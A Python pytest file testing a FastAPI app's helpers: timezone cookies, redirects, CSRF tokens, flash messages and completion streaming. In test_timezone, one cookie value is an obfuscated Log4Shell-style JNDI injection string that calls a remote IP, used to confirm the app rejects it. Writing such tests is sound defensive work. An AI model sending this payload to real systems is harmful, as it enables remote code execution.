import asyncio
import tempfile
from dataclasses import dataclass, field
from urllib.parse import urlencode

import pytest
from fastapi.templating import Jinja2Templates
from starlette.datastructures import FormData, Headers
from starlette.requests import Request

from app.models.accounts import User
from app.routers.dependencies import (
    Authentication,
    CompletionStreamManager,
    Helpers,
    stream_with_subscribers,
)

with tempfile.TemporaryDirectory() as tmp_dir:
    templates = Jinja2Templates(directory=tmp_dir)


def test_timezone():
    request = Request(scope={"type": "http", "headers": []})
    authentication = Authentication(request)
    helpers = Helpers(request, templates, authentication)
    assert helpers.timezone.key == "UTC"

    request = Request(scope={"type": "http", "headers": [(b"cookie", b"timezone=America/New_York")]})
    authentication = Authentication(request)
    helpers = Helpers(request, templates, authentication)
    assert helpers.timezone.key == "America/New_York"

    request = Request(scope={"type": "http", "headers": [(b"cookie", b"timezone=Invalid/TimeZone")]})
    authentication = Authentication(request)
    helpers = Helpers(request, templates, authentication)
    assert helpers.timezone.key == "UTC"

    malicious_timezone = "${:-y$}{${2s8:-j}nd${env:3fg:-}i:r${v93::-m}i://191.232.161.67:8000/i/hcSvqI7U/6784ec/fusz"
    request = Request(scope={"type": "http", "headers": [(b"cookie", f"timezone={malicious_timezone}".encode())]})
    authentication = Authentication(request)
    helpers = Helpers(request, templates, authentication)
    assert helpers.timezone.key == "UTC"

    # The authenticated user's saved zone wins over the browser cookie.
    request = Request(scope={"type": "http", "headers": [(b"cookie", b"timezone=America/New_York")]})
    authentication = Authentication(request)
    authentication.current_user = User(time_zone="America/Los_Angeles")
    helpers = Helpers(request, templates, authentication)
    assert helpers.timezone.key == "America/Los_Angeles"

    # An invalid saved zone falls back to the cookie rather than UTC.
    authentication.current_user = User(time_zone="Not/A_Real_Zone")
    helpers = Helpers(request, templates, authentication)
    assert helpers.timezone.key == "America/New_York"


@pytest.mark.asyncio
async def test_redirect_from_request():
    plain_headers = Headers({"content-type": "application/x-www-form-urlencoded"})
    headers = [(k.lower().encode("latin-1"), v.encode("latin-1")) for k, v in plain_headers.items()]

    request = Request(scope={"type": "http", "query_string": b"redirect_to=/some/path", "headers": headers})
    authentication = Authentication(request)
    helpers = Helpers(request, templates, authentication)
    assert await helpers.redirect_from_request() == "/some/path"

    request = Request(scope={"type": "http", "query_string": b"redirect_to=/some/path?query=123", "headers": headers})
    authentication = Authentication(request)
    helpers = Helpers(request, templates, authentication)
    assert await helpers.redirect_from_request() == "/some/path?query=123"

    request = Request(scope={"type": "http", "query_string": b"redirect_to=/some/path#fragment", "headers": headers})
    authentication = Authentication(request)
    helpers = Helpers(request, templates, authentication)
    assert await helpers.redirect_from_request() == "/some/path#fragment"

    request = Request(
        scope={"type": "http", "query_string": b"redirect_to=/some/path?query=123#fragment", "headers": headers}
    )
    authentication = Authentication(request)
    helpers = Helpers(request, templates, authentication)
    assert await helpers.redirect_from_request() == "/some/path?query=123#fragment"

    form_data = FormData({})
    request = Request(
        scope={"type": "http", "query_string": b"", "headers": headers}, receive=lambda: _receive(form_data)
    )
    authentication = Authentication(request)
    helpers = Helpers(request, templates, authentication)
    assert await helpers.redirect_from_request() is None

    form_data = FormData({"redirect_to": "/form/path?query=456#formfragment"})
    request = Request(
        scope={"type": "http", "query_string": b"", "headers": headers},
        receive=lambda: _receive(form_data),
    )
    authentication = Authentication(request)
    helpers = Helpers(request, templates, authentication)
    assert await helpers.redirect_from_request() == "/form/path?query=456#formfragment"


async def _receive(form_data: FormData):
    form_data_dict = {key: value for key, value in form_data.items()}
    encoded_form_data = urlencode(form_data_dict).encode("utf-8")
    return {"type": "http.request", "body": encoded_form_data, "more_body": False}


@dataclass
class MockCompletionStream:
    subscribers: list = field(default_factory=list)
    is_complete: bool = field(default=False)
    _lock: asyncio.Lock = field(default_factory=asyncio.Lock, init=False)

    def ensure_task(self):
        pass

    async def subscribe(self, subscriber):
        self.subscribers.append(subscriber)


def test_csrf_token():
    # Reads from session
    request = Request(scope={"type": "http", "headers": [], "session": {"csrf_token": "token-from-session"}})
    helpers = Helpers(request, templates, Authentication(request))
    assert helpers.csrf_token == "token-from-session"

    # Returns None when absent
    request = Request(scope={"type": "http", "headers": [], "session": {}})
    helpers = Helpers(request, templates, Authentication(request))
    assert helpers.csrf_token is None


def test_get_flashed_messages_does_not_modify_session_when_empty():
    request = Request(scope={"type": "http", "headers": [], "session": {}})
    authentication = Authentication(request)
    helpers = Helpers(request, templates, authentication)

    helpers.get_flashed_messages()

    assert "flashes" not in request.session


def test_get_flashed_messages_clears_session_when_not_empty():
    request = Request(
        scope={"type": "http", "headers": [], "session": {"flashes": [{"content": "Test", "level": "success"}]}}
    )
    authentication = Authentication(request)
    helpers = Helpers(request, templates, authentication)

    messages = helpers.get_flashed_messages()

    assert len(messages) == 1
    assert messages[0].content == "Test"
    assert request.session["flashes"] == []


@pytest.mark.asyncio
async def test_stream_manager_basic_operations():
    stream_manager = CompletionStreamManager()

    def completion_factory():
        return MockCompletionStream()

    # Test creating and retrieving same completion
    first = await stream_manager.get_or_create_completion("1", completion_factory)
    second = await stream_manager.get_or_create_completion("1", completion_factory)
    assert first is second

    # Test different keys create different completions
    third = await stream_manager.get_or_create_completion("2", completion_factory)
    assert third is not first

    # Test cleanup removes completion
    await stream_manager.cleanup_completion("1")
    assert "1" not in stream_manager._active_completions
    assert "2" in stream_manager._active_completions

    # Test cleanup of non-existent key doesn't error
    await stream_manager.cleanup_completion("nonexistent")


@pytest.mark.asyncio
async def test_stream_with_subscribers_basic():
    stream_manager = CompletionStreamManager()
    completion = MockCompletionStream()

    async def send_events():
        for subscriber in completion.subscribers:
            await subscriber({"event": "start", "data": "beginning"})
            await subscriber({"event": "data", "data": "test"})
            await subscriber({"event": "end", "data": "done"})

    asyncio.create_task(send_events())

    events = []
    async for event in stream_with_subscribers(completion, "test", stream_manager):
        events.append(event)

    # Verify all events received and stream ends on 'end' event
    assert len(events) == 3
    assert events[0]["event"] == "start"
    assert events[1]["event"] == "data"
    assert events[2]["event"] == "end"
    assert events[-1]["data"] == "done"

    # Verify subscriber was added and then removed
    assert len(completion.subscribers) == 0
